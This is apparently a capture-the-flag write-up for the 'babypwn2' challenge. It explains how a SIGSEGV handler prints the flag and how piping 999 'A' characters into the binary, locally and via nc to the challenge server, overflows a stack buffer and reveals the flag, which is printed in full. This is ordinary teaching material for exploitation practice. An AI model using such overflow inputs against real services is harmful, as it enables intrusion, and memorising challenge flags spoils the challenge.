Taking a look at `babypwn2.c`, we see:


```c
	signal(SIGSEGV, getflag);
```
This line wasn't completely obvious, but it does kind of show that a seg fault is somehow 
related to getting the flag. <br>
Even if you missed this, your first instinct when you see a buffer overflow should be to 
send enough input to the program to get a segfault, so that you can get some important 
debugging info.

This gives rise to the following kind of exploit: 

```bash
python3 -c 'print("A" * 100)' | ./babypwn2
```

Of course, if you try this, it doesn't fail at all; most of the input simply overwrites 
entries of the `very_important_information` array. (Recall that the size of an array
is `sizeof(int) * LEN == 400`) <br>
Also, noticing the `input` array is also in the stack, with a length of `100`, we 
might guess that we need an input of size larger than 500. To be safe, we can send in 
`999` and see what happens:

```bash
$ python3 -c 'print("A" * 999)' | nc oreos.imaginaryctf.org 30000
This is a very secure and foolproof server, which is very important, because if this server broke, very bad things would happen.
Please enter an address for the information you would like to retrieve. The first 8 bytes entered will be treated as the address. Large addresses will be truncated.

Address: Here is your very important information: 0x41414141.
Goodbye!
Error 11: ictf{b0f?ju5+_@dd_m0r3_buff3r}
```
